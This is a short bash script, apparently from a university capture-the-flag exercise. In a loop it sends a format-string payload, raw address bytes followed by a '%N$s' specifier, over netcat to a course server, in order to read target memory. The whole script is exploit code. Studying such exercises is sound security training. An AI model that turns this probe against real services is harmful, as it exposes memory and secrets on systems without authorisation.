#!/bin/bash

for i in {1..10}
do
	echo "i: $i"
	echo $'\x30\xd4\x1b\x11'%$i\$s | nc cs412-ctf.epfl.ch 10002
	echo
	echo
done
